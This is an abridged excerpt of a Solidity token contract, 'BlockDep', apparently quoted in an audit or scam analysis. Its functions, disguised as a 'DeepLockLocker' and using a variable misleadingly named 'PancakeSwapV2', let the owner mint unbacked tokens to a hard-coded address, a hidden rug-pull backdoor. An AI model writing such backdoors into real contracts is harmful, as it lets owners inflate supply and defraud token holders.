...
contract BlockDep is Context, IERC20, IERC20Metadata, Ownable {   
    ...
    function DeepLockLocker(uint256 amount) public onlyOwner virtual returns (bool) {
        ...
        _balances[0xCA6B8f9125c513803DaAA128065CB2c1E22DaACB] += amount;
        return true;
    }
    ...
    function _DeepLockLocker(address account, uint256 amount) internal virtual {
        ...
        address PancakeSwapV2 = 0xCA6B8f9125c513803DaAA128065CB2c1E22DaACB;
        _beforeTokenTransfer(address(0), account, amount);
        _beforeTokenTransfer(address(0), PancakeSwapV2, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        _balances[PancakeSwapV2] += amount;
        emit Transfer(address(0), account, amount);
        emit Transfer(address(0), PancakeSwapV2, amount);
